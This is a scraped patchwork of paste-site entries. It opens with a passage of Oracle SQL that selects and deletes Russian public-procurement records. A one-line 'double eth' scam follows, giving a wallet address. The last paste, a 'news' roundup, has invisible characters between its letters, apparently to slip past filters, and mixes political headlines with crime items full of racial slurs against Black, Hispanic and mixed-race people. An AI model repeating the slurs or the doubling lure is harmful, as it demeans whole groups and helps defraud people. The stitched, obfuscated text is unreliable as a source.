       pro.reqnum,  coalesce(pro.DATE_DEMAND_START,pro.first_notice_try) first_notice_try, --  Дата первой успешно отправленной версии извещения (xml-пакета)в ЕИС ( НЕ ВСЕГДА = Дате публикации извещения)  
       case when pro.joflag=1 then 1 else 0 end sovm,
       cons.orgtitle c_org,
       case when pro.placement='Централизованная закупка' then 1 else 0 end centr,
       fin.flag_pp, --в рамках ч.6п.15 (переданные полномочия)      
       pro.orgtitle org_pp, --организац, осуществляющая полномочия заказчика 
       Case When (pro.sed_reg_number Is Not Null or pro.request_order_number Is Not Null) Then 1 Else 0 End UOPLACING, 
       uo_org.FULL_NAME uo_org,
       fin.LOTUUID, 
       fin.finyear, -- год финансирования
       fin.TARGETEXPENSEITEMCODE, 
       t.NP_CODE_NAME,t.FP_CODE_NAME,
       case when fin.targetexpenseitemcode in ( Select targetexpenseitemcode From dwh_targetexpenseitemcode_aip ) and fin.expensetypecode not in '244'  
       or (fin.targetexpenseitemcode in ('022E15305F','021E15305F') and fin.expensetypecode='414' and fin.kosgucode='310' and pro.orgid='1506') -- правило по письму крицкой от 5.10.222       
            Then 'Да' else 'Нет'     
        end priznak,--Признак совпадения целевой статьи (АИП)
       pro.F_PRODUCTPRICE, fin.FINSUM, fin.budget_type, fin.expensetypecode, fin.kosgucode,fin.fundcode,
       pro.REQUESTID,
       pro.LOTSTAGE,
       pro.FORDERTYPENAME, pro.ONEEXEC,pro.SUBJECT, org.CONTRAGENT_ACCOUNT,
       pro.date_notice_published-- Дата размещения первой версии извещения на ЕИС    
From FIN_TARG_ZAK_2024_table fin -- 28.09.22 создана таблица с инф-цией по финансированию закупок(с 3-мя union)
  Join dwh_procedures_kgntv pro on nvl(pro.lot_cons_m,pro.lotuuid)=fin.lotuuid 
                                   And(( ((pro.lot_cons_m=pro.lotuuid and pro.mord_flag='M') or pro.lot_cons_m Is Null) -- берем только мать pro.lot_cons_m=pro.lotuuid and pro.mord_flag='M'
                                   And pro.reqnum Not In (Select reqnum From wrong_purchase)
								   And pro.reqnum Is Not Null
								   And ( pro.final_decision <>'Отмена закупки' or pro.final_decision is null) 
								   And pro.lotstageid not in (93,100,146,61) -- 93 Процедура отменена, 
  																	      -- 100 - обновление от 27.09.2019 корректировка Яковлева А.И. (не учитывать статус закупка не состоялась)
																		  -- 146 Закупка отменена от 03.12.2021 Крицкая Л.А. 
																		  -- 61 Исполнение контракта
								   And pro.orgid in (Select id From dwh_organization_not_zak ) --необходимо убрать учреждения законодательной власти  
								   And pro.orgid<>1610 --16.11.2021 Письмо Крицкой Л.А.)
								   )or pro.lotuuid=4996697 -- Выключить закупку при переходе в стадию по заключению контракта
                                   ) 
  Join dwh_organization_kgntv   org on org.id=pro.orgid 
  Left Join dwh_targetexpenseitemcode_2020 t on t.targetexpenseitemcode=fin.targetexpenseitemcode
  Left Join dwh_contract_kgntv con on fin.lotuuid=con.lotid 
  Left Join dwh_organization_kgntv uo_org on uo_org.id = pro.uo_orgid  
  Left Join dwh_procedures_cons_kgntv cons on cons.lotuuid = pro.Joint_procedure_id
  Left Join dwh_vg_22 vg on vg.grbs_id = pro.grbsid
  Left Join (
                Select distinct purchasenumber 
                From dwh_protocol_nrpz_acgz  	
                where TYPE in('fcsProtocolDeviation', 'fcsProtocolEvasion', 'epProtocolEvasion', 'epProtocolDeviation') 
            ) prot On prot.purchasenumber=pro.reqnum 
  Left Join ( 
                Select distinct purchasenumber
                From dwh_start_notice_canc_acgz
            ) canc on canc.purchasenumber=pro.reqnum
  Left Join (Select distinct purchasenumber From dwh_notice_prolong_nrpz) notice on notice.purchasenumber=pro.reqnum           
  where   con.CONTRACTRNK is null 
        And prot.purchasenumber is null -- Крицкая Л.А. 19.04.2021 Убрать закупки, в которых есть ""уклонение участника или отказ заказчика от заключения контракта""
        And canc.purchasenumber is null -- Крицкая Л.А. 19.04.2021 Убрать закупки, у которых есть протокол извещения об отмене        
        And pro.reqnum not in ( 
                                Select distinct reqnum 
                                From dwh_procedures_kgntv pro
                                Join dwh_contract_kgntv con On con.lotid=pro.lotuuid
                                Where pro.reqnum Is Not Null
                              ) -- Крицкая Л.А. 19.04.2021 Убрать совместные закупки, если по извещению есть хоть один контракт
        And case when pro.lotstage='Закупка не состоялась (продление сроков подачи заявок)' And notice.purchasenumber is null then 1 else 0 end = 0 --Крицкая Л.А. письмо от 24.06.2021 
		
union all

Select  to_char(org.id) orgid, proc.responsibleorg_fullname,org.short_name, org.inn, org.kpp, 
        org.grbs_full_name, org.grbs_inn, to_char(org.parentid) grbsid, vg.vg_name vg,
        pos.pg_ikz pg_ikz, proc.plannumber,proc.positionnumber, proc.purchasecode, proc.purchasenumber,
        null first_notice_try,
        0 As sovm,
        null As c_org,
        0 As centr,
        1 flag_pp,
        proc.responsibleorg_fullname org_pp,
        Case When maxprice>=40000000 Then 1 Else 0 End, --uoplacing 
        null uo_org,
        null lotuuid,
        2024 finyear, --год финансирования
        proc.targetexpenseitemcode,
        t.np_code_name, t.fp_code_name,
        case when proc.targetexpenseitemcode in ( Select targetexpenseitemcode From dwh_targetexpenseitemcode_aip ) and to_number(proc.kvr) not in (244) then 'Да' else 'Нет'              
        end priznak,--Признак совпадения целевой статьи (АИП)
        proc.maxprice,
        Case
            When proc.currentyear is null Then null
            When 2024 = proc.currentyear then proc.finsum_currentyear 
            When 2024-1 = proc.currentyear then proc.finsum_firstyear 
            When 2024-2 = proc.currentyear then proc.finsum_secondyear 
        end finsum,
        null budjet_type,--тип финансирования
        to_number(proc.kvr) kvr,
        null kosgu,--КОСГУ
		null fundcode, -- Код фонда
        null requestid,
        null status,
        proc.placingway_name,
        null onex,
        purchaseobjectinfo
        , org.CONTRAGENT_ACCOUNT,    
        null date_notice_published
From proc 
Left Join con On proc.purchasenumber=con.notificationnumber
Left Join dwh_organization_kgntv org on proc.responsibleorg_fullname=org.full_name
Left Join dwh_schedule_pos_2020_kgntv pos On pos.pg_rn=proc.positionnumber
Left Join dwh_targetexpenseitemcode_2020 t On t.targetexpenseitemcode=proc.targetexpenseitemcode
Left Join dwh_vg_22 vg On vg.grbs_id=org.parentid
Left Join (
            Select distinct purchasenumber 
            From dwh_protocol_nrpz_acgz  	
            where TYPE in('fcsProtocolDeviation', 'fcsProtocolEvasion', 'epProtocolEvasion', 'epProtocolDeviation') 
        ) prot On prot.purchasenumber=proc.purchasenumber 
Left Join ( 
            Select distinct purchasenumber
            From dwh_start_notice_canc_acgz
        ) canc on canc.purchasenumber=proc.purchasenumber
Left Join (Select distinct purchasenumber From dwh_notice_prolong_nrpz) notice on notice.purchasenumber=proc.purchasenumber 
Left Join (Select distinct reqnum From dwh_procedures_kgntv) p On p.reqnum=proc.purchasenumber
Where proc.purchasenumber Is Not Null And con.notificationnumber is null
And Case
            When currentyear is null Then 0
            When 2024 = currentyear And finsum_currentyear<>0 then 1 
            When 2024-1 = currentyear And finsum_firstyear <>0 then 1 
            When 2024-2 = currentyear And finsum_secondyear<>0 then 1 
            ELse 0
    end =1
And prot.purchasenumber is null -- Крицкая Л.А. 19.04.2021 Убрать закупки, в которых есть ""уклонение участника или отказ заказчика от заключения контракта""
And canc.purchasenumber is null -- Крицкая Л.А. 19.04.2021 Убрать закупки, у которых есть протокол извещения об отмене    
And p.reqnum is null --Необходимо убрать те извещения, которые уже есть в АИСГЗ
And proc.responsibleorg_fullname<>'ФЕДЕРАЛЬНОЕ ГОСУДАРСТВЕННОЕ БЮДЖЕТНОЕ УЧРЕЖДЕНИЕ КУЛЬТУРЫ ""ГОСУДАРСТВЕННЫЙ МУЗЕЙ-ЗАПОВЕДНИК ""ПАВЛОВСК""'
And proc.purchasenumber not in (Select reqnum From wrong_purchase);

-- Удаляем закупки у которых нет протокола подведения итогов определения поставщика и прошло более 50 рабочих дней с момента публикации первой версии извещения
DELETE FROM dwh_detailing_zak_general_2024
WHERE reqnum in 
(SELECT reqnum FROM dwh_detailing_zak_general_2024 z
  LEFT JOIN (
      SELECT purchasenumber, 
             type, 
            max(protocoldate) protocolopr ,
            protocolnumber
        FROM dwh_protocol_nrpz_acgz
       WHERE type in (
                        'epProtocolEOK3',
                        'epProtocolEZK2020Final',
                        'epProtocolEOKOU3',
                        'epProtocolEOK2020Final',
                        'fcsProtocolEF3',
                        'epProtocolEF2020Final',
                        'epProtocolEZT2020FinalPart')
       GROUP BY purchasenumber, type, protocolnumber) prot on z.reqnum = prot.purchasenumber
       Left Join (
	Select Distinct
		protocolnumber,
		purchasenumber,
        protocoldate
	From dwh_protocol_nrpz_acgz
	Where type In ('ProtocolCancel','fcsProtocolCancel','epProtocolCancel') 
		  ) canc On canc.protocolnumber = prot.protocolnumber And canc.purchasenumber = prot.purchasenumber And prot.protocolopr < canc.protocoldate
WHERE (case when sysdate > (SELECT min(t.date_)
                              FROM work_Days_of_2019 t 
                              JOIN work_Days_of_2019 t1 on (t.date_>t1.date_ and t.nm=t1.nm+50)
                             WHERE t1.date_ >= (SELECT min(date_)
                                                  FROM work_Days_all
                                                 WHERE DATE_ >= (trunc(z.first_notice_try)) and type=1)) and (/*protocolopr is null or*/ canc.protocolnumber is /*not*/ null) then 1 else 0 end ) = 1)"
5RVKpQ3r,wallet,BrainRTP,Lua,Tuesday 23rd of April 2024 09:03:57 AM CDT,"double eth

send to 0x650e6888511805f92E7A9A833E354da3D7D24766"
Fe6pGZCb,News April23 24,Newscaster_Ned,Email,Tuesday 23rd of April 2024 08:48:26 AM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎

T‎i‎m‎e‎ ‎f‎o‎r‎ ‎a‎n‎ ‎u‎p‎d‎a‎t‎e‎ ‎o‎n‎ ‎t‎h‎e‎ ‎m‎o‎n‎k‎e‎y‎s‎.‎

D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎G‎a‎g‎g‎e‎d‎ ‎a‎s‎ ‎W‎i‎t‎n‎e‎s‎s‎ ‎M‎i‎c‎h‎a‎e‎l‎ ‎C‎o‎h‎e‎n‎ ‎C‎a‎l‎l‎s‎ ‎H‎i‎m‎ ‎'‎V‎o‎n‎ ‎S‎h‎i‎t‎z‎I‎n‎P‎a‎n‎t‎z‎'‎
O‎u‎s‎t‎e‎d‎ ‎T‎e‎x‎a‎s‎ ‎B‎i‎s‎h‎o‎p‎ ‎D‎e‎n‎o‎u‎n‎c‎e‎s‎ ‎‘‎S‎i‎l‎e‎n‎t‎ ‎S‎h‎e‎p‎h‎e‎r‎d‎s‎,‎’‎ ‎‘‎C‎o‎r‎r‎u‎p‎t‎ ‎V‎a‎t‎i‎c‎a‎n‎’‎
S‎w‎e‎d‎e‎n‎ ‎S‎e‎i‎z‎e‎s‎ ‎1‎.‎4‎ ‎T‎o‎n‎s‎ ‎o‎f‎ ‎C‎o‎c‎a‎i‎n‎e‎
T‎w‎o‎ ‎R‎e‎a‎s‎o‎n‎s‎ ‎B‎i‎d‎e‎n‎ ‎F‎a‎c‎e‎s‎ ‎'‎T‎o‎u‎g‎h‎e‎r‎'‎ ‎E‎l‎e‎c‎t‎o‎r‎a‎l‎ ‎C‎o‎l‎l‎e‎g‎e‎ ‎P‎a‎t‎h‎ ‎t‎o‎ ‎2‎7‎0‎
T‎o‎m‎m‎y‎ ‎R‎o‎b‎i‎n‎s‎o‎n‎ ‎C‎l‎e‎a‎r‎e‎d‎ ‎a‎s‎ ‎J‎u‎d‎g‎e‎ ‎R‎u‎l‎e‎s‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎B‎a‎n‎ ‎W‎a‎s‎ ‎'‎U‎n‎l‎a‎w‎f‎u‎l‎'‎
‘‎A‎ ‎K‎n‎i‎g‎h‎t‎’‎s‎ ‎T‎a‎l‎e‎’‎ ‎D‎i‎r‎e‎c‎t‎o‎r‎:‎ ‎N‎e‎t‎f‎l‎i‎x‎ ‎A‎l‎g‎o‎r‎i‎t‎h‎m‎ ‎R‎e‎j‎e‎c‎t‎e‎d‎ ‎S‎e‎q‎u‎e‎l‎ ‎w‎i‎t‎h‎ ‎F‎e‎m‎a‎l‎e‎
R‎a‎n‎d‎ ‎P‎a‎u‎l‎ ‎D‎e‎m‎a‎n‎d‎s‎ ‎A‎n‎s‎w‎e‎r‎s‎ ‎o‎n‎ ‎D‎a‎n‎g‎e‎r‎o‎u‎s‎ ‎B‎i‎o‎l‎a‎b‎s‎
N‎B‎C‎ ‎N‎e‎w‎s‎ ‎P‎o‎l‎l‎:‎ ‎T‎r‎u‎m‎p‎ ‎M‎o‎r‎e‎ ‎'‎C‎o‎m‎p‎e‎t‎e‎n‎t‎'‎ ‎t‎h‎a‎n‎ ‎B‎i‎d‎e‎n‎,‎ ‎U‎p‎ ‎2‎1‎ ‎P‎o‎i‎n‎t‎s‎ ‎S‎i‎n‎c‎e‎ ‎2‎0‎2‎0‎ ‎
C‎a‎r‎t‎e‎l‎ ‎G‎u‎n‎m‎e‎n‎ ‎D‎u‎m‎p‎ ‎8‎ ‎B‎o‎d‎i‎e‎s‎ ‎o‎n‎ ‎M‎e‎x‎i‎c‎a‎n‎ ‎B‎o‎r‎d‎e‎r‎ ‎S‎t‎a‎t‎e‎ ‎H‎i‎g‎h‎w‎a‎y‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎A‎d‎v‎i‎s‎e‎r‎:‎ ‎T‎w‎o‎ ‎R‎e‎a‎s‎o‎n‎s‎ ‎B‎i‎d‎e‎n‎ ‎F‎a‎c‎e‎s‎ ‎‘‎T‎o‎u‎g‎h‎e‎r‎’‎ ‎E‎l‎e‎c‎t‎o‎r‎a‎l‎ ‎C‎o‎l‎l‎e‎g‎e‎ ‎P‎a‎t‎h‎ ‎t‎o‎ ‎2‎7‎0‎
B‎i‎d‎e‎n‎ ‎U‎n‎e‎m‎p‎l‎o‎y‎m‎e‎n‎t‎
P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎f‎a‎c‎e‎s‎ ‎a‎ ‎m‎u‎c‎h‎ ‎“‎t‎o‎u‎g‎h‎e‎r‎”‎ ‎p‎a‎t‎h‎ ‎t‎h‎a‎n‎ ‎h‎i‎s‎ ‎o‎p‎p‎o‎n‎e‎n‎t‎ ‎t‎o‎ ‎o‎b‎t‎a‎i‎n‎ ‎t‎h‎e‎ ‎2‎7‎0‎ ‎e‎l‎e‎c‎t‎o‎r‎a‎l‎ ‎c‎o‎l‎l‎e‎g‎e‎ ‎v‎o‎t‎e‎s‎ ‎n‎e‎e‎d‎e‎d‎ ‎t‎o‎ ‎w‎i‎n‎ ‎t‎h‎e‎ ‎p‎r‎e‎s‎i‎d‎e‎n‎t‎i‎a‎l‎ ‎e‎l‎e‎c‎t‎i‎o‎n‎,‎ ‎l‎o‎n‎g‎t‎i‎m‎e‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎a‎d‎v‎i‎s‎e‎r‎ ‎D‎o‎u‎g‎ ‎S‎o‎s‎n‎i‎k‎ ‎w‎r‎o‎t‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎T‎i‎m‎e‎s‎.‎

S‎h‎o‎u‎l‎d‎ ‎M‎e‎r‎r‎i‎c‎k‎ ‎G‎a‎r‎l‎a‎n‎d‎ ‎b‎e‎ ‎i‎m‎p‎e‎a‎c‎h‎e‎d‎?‎

Y‎E‎S‎N‎O‎
M‎O‎S‎T‎ ‎P‎O‎P‎U‎L‎A‎R‎
W‎A‎T‎C‎H‎:‎ ‎A‎n‎t‎i‎-‎I‎s‎r‎a‎e‎l‎ ‎P‎r‎o‎t‎e‎s‎t‎e‎r‎s‎ ‎a‎t‎ ‎C‎o‎l‎u‎m‎b‎i‎a‎ ‎C‎h‎a‎n‎t‎ ‎P‎r‎o‎-‎T‎e‎r‎r‎o‎r‎ ‎S‎l‎o‎g‎a‎n‎s‎
W‎A‎T‎C‎H‎:‎ ‎A‎n‎t‎i‎-‎I‎s‎r‎a‎e‎l‎ ‎P‎r‎o‎t‎e‎s‎t‎e‎r‎s‎ ‎a‎t‎ ‎C‎o‎l‎u‎m‎b‎i‎a‎ ‎C‎h‎a‎n‎t‎ ‎P‎r‎o‎-‎T‎e‎r‎r‎o‎r‎ ‎S‎l‎o‎g‎a‎n‎s‎
4‎,‎7‎8‎4‎
A‎l‎i‎n‎a‎ ‎H‎a‎b‎b‎a‎:‎ ‎C‎r‎i‎m‎i‎n‎a‎l‎ ‎a‎n‎d‎ ‎C‎i‎v‎i‎l‎ ‎C‎o‎u‎r‎t‎s‎ ‎B‎e‎i‎n‎g‎ ‎U‎s‎e‎d‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎T‎r‎u‎m‎p‎ ‎B‎e‎c‎a‎u‎s‎e‎ ‎‘‎T‎h‎e‎y‎ ‎C‎a‎n‎n‎o‎t‎ ‎B‎e‎a‎t‎ ‎H‎i‎m‎
H‎a‎b‎b‎a‎:‎ ‎C‎o‎u‎r‎t‎s‎ ‎B‎e‎i‎n‎g‎ ‎U‎s‎e‎d‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎T‎r‎u‎m‎p‎ ‎B‎e‎c‎a‎u‎s‎e‎ ‎T‎h‎e‎y‎ ‎C‎a‎n‎'‎t‎ ‎B‎e‎a‎t‎ ‎H‎i‎m‎ ‎i‎n‎ ‎P‎o‎l‎l‎s‎
4‎,‎9‎3‎3‎
G‎O‎P‎ ‎R‎e‎p‎.‎ ‎C‎a‎r‎l‎ ‎P‎r‎e‎d‎i‎c‎t‎s‎ ‎B‎a‎c‎k‎l‎a‎s‎h‎ ‎f‎r‎o‎m‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎ ‎C‎o‎m‎m‎u‎n‎i‎t‎y‎ ‎f‎o‎r‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎W‎h‎o‎ ‎T‎u‎r‎n‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎S‎p‎e‎a‎k‎e‎r‎ ‎J‎o‎h‎n‎s‎
C‎a‎r‎l‎ ‎P‎r‎e‎d‎i‎c‎t‎s‎ ‎B‎a‎c‎k‎l‎a‎s‎h‎ ‎f‎r‎o‎m‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎ ‎C‎o‎m‎m‎u‎n‎i‎t‎y‎ ‎o‎v‎e‎r‎ ‎S‎p‎e‎a‎k‎e‎r‎ ‎J‎o‎h‎n‎s‎o‎n‎
2‎4‎2‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎A‎d‎v‎i‎s‎e‎r‎:‎ ‎T‎w‎o‎ ‎R‎e‎a‎s‎o‎n‎s‎ ‎B‎i‎d‎e‎n‎ ‎F‎a‎c‎e‎s‎ ‎‘‎T‎o‎u‎g‎h‎e‎r‎’‎ ‎E‎l‎e‎c‎t‎o‎r‎a‎l‎ ‎C‎o‎l‎l‎e‎g‎e‎ ‎P‎a‎t‎h‎ ‎t‎o‎ ‎2‎7‎0‎
T‎w‎o‎ ‎R‎e‎a‎s‎o‎n‎s‎ ‎B‎i‎d‎e‎n‎ ‎F‎a‎c‎e‎s‎ ‎'‎T‎o‎u‎g‎h‎e‎r‎'‎ ‎E‎l‎e‎c‎t‎o‎r‎a‎l‎ ‎C‎o‎l‎l‎e‎g‎e‎ ‎P‎a‎t‎h‎ ‎t‎o‎ ‎2‎7‎0‎
8‎2‎6‎
M‎S‎N‎B‎C‎’‎s‎ ‎M‎a‎d‎d‎o‎w‎:‎ ‎T‎r‎u‎m‎p‎ ‎‘‎S‎e‎e‎m‎e‎d‎ ‎O‎l‎d‎ ‎a‎n‎d‎ ‎T‎i‎r‎e‎d‎ ‎a‎n‎d‎ ‎M‎a‎d‎’‎ ‎i‎n‎ ‎C‎o‎u‎r‎t‎
M‎S‎N‎B‎C‎'‎s‎ ‎M‎a‎d‎d‎o‎w‎:‎ ‎T‎r‎u‎m‎p‎ ‎'‎S‎e‎e‎m‎e‎d‎ ‎O‎l‎d‎ ‎a‎n‎d‎ ‎T‎i‎r‎e‎d‎ ‎a‎n‎d‎ ‎M‎a‎d‎'‎ ‎i‎n‎ ‎C‎o‎u‎r‎t‎
8‎8‎5‎
O‎b‎a‎m‎a‎’‎s‎ ‎P‎a‎s‎s‎o‎v‎e‎r‎ ‎M‎e‎s‎s‎a‎g‎e‎ ‎A‎d‎d‎s‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎s‎ ‎I‎n‎t‎o‎ ‎t‎h‎e‎ ‎S‎t‎o‎r‎y‎;‎ ‎O‎m‎i‎t‎s‎ ‎H‎o‎s‎t‎a‎g‎e‎s‎
O‎b‎a‎m‎a‎'‎s‎ ‎P‎a‎s‎s‎o‎v‎e‎r‎ ‎M‎e‎s‎s‎a‎g‎e‎ ‎R‎e‎c‎a‎l‎l‎s‎ ‎S‎u‎f‎f‎e‎r‎i‎n‎g‎ ‎i‎n‎ ‎'‎I‎s‎r‎a‎e‎l‎ ‎a‎n‎d‎ ‎G‎a‎z‎a‎'‎
8‎4‎2‎
D‎e‎m‎ ‎R‎e‎p‎ ‎K‎h‎a‎n‎n‎a‎:‎ ‎I‎ ‎W‎o‎u‎l‎d‎ ‎V‎o‎t‎e‎ ‎t‎o‎ ‎P‎r‎o‎t‎e‎c‎t‎ ‎S‎p‎e‎a‎k‎e‎r‎ ‎J‎o‎h‎n‎s‎o‎n‎
D‎e‎m‎ ‎R‎e‎p‎ ‎K‎h‎a‎n‎n‎a‎:‎ ‎I‎ ‎W‎o‎u‎l‎d‎ ‎V‎o‎t‎e‎ ‎t‎o‎ ‎P‎r‎o‎t‎e‎c‎t‎ ‎S‎p‎e‎a‎k‎e‎r‎ ‎J‎o‎h‎n‎s‎o‎n‎
6‎,‎3‎0‎5‎
C‎o‎l‎u‎m‎b‎i‎a‎ ‎M‎o‎v‎e‎s‎ ‎t‎o‎ ‎V‎i‎r‎t‎u‎a‎l‎ ‎C‎l‎a‎s‎s‎e‎s‎ ‎a‎s‎ ‎P‎r‎o‎-‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎ ‎P‎r‎o‎t‎e‎s‎t‎s‎ ‎E‎r‎u‎p‎t‎
C‎o‎l‎u‎m‎b‎i‎a‎ ‎M‎o‎v‎e‎s‎ ‎t‎o‎ ‎V‎i‎r‎t‎u‎a‎l‎ ‎C‎l‎a‎s‎s‎e‎s‎ ‎a‎s‎ ‎P‎r‎o‎-‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎ ‎P‎r‎o‎t‎e‎s‎t‎s‎ ‎E‎r‎u‎p‎t‎
4‎,‎8‎7‎2‎
T‎u‎r‎l‎e‎y‎:‎ ‎T‎r‎u‎m‎p‎ ‎I‎s‎ ‎R‎i‎g‎h‎t‎ ‎—‎ ‎N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎C‎a‎s‎e‎ ‎I‎s‎ ‎a‎n‎ ‎‘‎E‎m‎b‎a‎r‎r‎a‎s‎s‎m‎e‎n‎t‎’‎
T‎u‎r‎l‎e‎y‎:‎ ‎N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎C‎a‎s‎e‎ ‎I‎s‎ ‎a‎n‎ ‎'‎E‎m‎b‎a‎r‎r‎a‎s‎s‎m‎e‎n‎t‎'‎
5‎0‎3‎
T‎o‎m‎m‎y‎ ‎R‎o‎b‎i‎n‎s‎o‎n‎ ‎C‎l‎e‎a‎r‎e‎d‎ ‎o‎f‎ ‎C‎h‎a‎r‎g‎e‎s‎ ‎a‎s‎ ‎J‎u‎d‎g‎e‎ ‎R‎u‎l‎e‎s‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎B‎a‎n‎ ‎W‎a‎s‎ ‎‘‎U‎n‎l‎a‎w‎f‎u‎l‎’‎
T‎o‎m‎m‎y‎ ‎R‎o‎b‎i‎n‎s‎o‎n‎ ‎C‎l‎e‎a‎r‎e‎d‎ ‎a‎s‎ ‎J‎u‎d‎g‎e‎ ‎R‎u‎l‎e‎s‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎B‎a‎n‎ ‎W‎a‎s‎ ‎'‎U‎n‎l‎a‎w‎f‎u‎l‎'‎

S‎p‎o‎o‎k‎ ‎G‎e‎t‎s‎ ‎4‎0‎ ‎Y‎e‎a‎r‎s‎ ‎A‎f‎t‎e‎r‎ ‎B‎e‎a‎t‎i‎n‎g‎ ‎H‎i‎s‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎G‎i‎r‎l‎f‎r‎i‎e‎n‎d‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎w‎i‎t‎h‎ ‎H‎a‎m‎m‎e‎r‎.‎

N‎o‎w‎ ‎w‎h‎o‎'‎s‎ ‎g‎o‎n‎n‎a‎ ‎f‎e‎e‎d‎ ‎t‎h‎e‎i‎r‎ ‎f‎o‎u‎r‎ ‎h‎a‎l‎f‎-‎c‎a‎s‎t‎e‎s‎?‎


B‎r‎o‎n‎x‎:‎ ‎H‎o‎o‎d‎e‎d‎ ‎C‎h‎i‎m‎p‎ ‎S‎t‎e‎a‎l‎s‎ ‎M‎a‎n‎'‎s‎ ‎H‎e‎a‎r‎t‎ ‎M‎e‎d‎i‎c‎a‎t‎i‎o‎n‎.‎


N‎e‎w‎ ‎J‎e‎r‎s‎e‎y‎:‎ ‎S‎h‎e‎b‎o‎o‎n‎ ‎S‎p‎e‎c‎i‎a‎l‎ ‎D‎r‎i‎v‎e‎r‎ ‎C‎r‎a‎s‎h‎e‎s‎ ‎S‎c‎h‎o‎o‎l‎ ‎B‎u‎s‎ ‎W‎h‎i‎l‎e‎ ‎H‎i‎g‎h‎ ‎o‎n‎ ‎H‎e‎r‎o‎i‎n‎.‎


C‎o‎p‎s‎ ‎I‎d‎e‎n‎t‎i‎f‎y‎ ‎D‎a‎r‎k‎i‎e‎ ‎W‎h‎o‎ ‎S‎e‎t‎ ‎M‎a‎c‎y‎’‎s‎ ‎D‎r‎e‎s‎s‎i‎n‎g‎ ‎R‎o‎o‎m‎ ‎A‎b‎l‎a‎z‎e‎.‎


N‎e‎g‎r‎o‎ ‎w‎i‎t‎h‎ ‎S‎t‎u‎p‎i‎d‎ ‎G‎l‎a‎s‎s‎e‎s‎ ‎G‎e‎t‎s‎ ‎3‎9‎ ‎Y‎e‎a‎r‎s‎ ‎A‎f‎t‎e‎r‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎A‎f‎t‎e‎r‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎ ‎u‎p‎ ‎M‎a‎n‎h‎a‎t‎t‎a‎n‎ ‎N‎i‎g‎h‎t‎c‎l‎u‎b‎.‎


S‎p‎i‎c‎ ‎R‎u‎n‎s‎ ‎O‎v‎e‎r‎ ‎P‎r‎e‎g‎n‎a‎n‎t‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎a‎n‎d‎ ‎N‎e‎g‎r‎o‎ ‎A‎f‎t‎e‎r‎ ‎T‎h‎e‎y‎ ‎A‎s‎k‎e‎d‎ ‎H‎i‎m‎ ‎t‎o‎ ‎S‎t‎o‎p‎ ‎S‎m‎o‎k‎i‎n‎g‎.‎


W‎o‎m‎a‎n‎ ‎F‎i‎g‎h‎t‎s‎ ‎o‎f‎f‎ ‎T‎a‎c‎o‎ ‎B‎e‎n‎d‎e‎r‎ ‎i‎n‎ ‎M‎a‎n‎h‎a‎t‎t‎a‎n‎ ‎A‎p‎a‎r‎t‎m‎e‎n‎t‎ ‎C‎o‎m‎p‎l‎e‎x‎ ‎S‎t‎a‎i‎r‎w‎e‎l‎l‎.‎


S‎p‎i‎c‎ ‎M‎S‎-‎1‎3‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎W‎h‎o‎ ‎S‎h‎o‎t‎ ‎u‎p‎ ‎S‎u‎b‎w‎a‎y‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎w‎i‎t‎h‎o‎u‎t‎ ‎B‎a‎i‎l‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎u‎e‎ ‎2‎3‎ ‎|‎ ‎D‎a‎y‎
7‎8‎°‎
2‎%‎
S‎
1‎2‎
 ‎
m‎p‎h‎
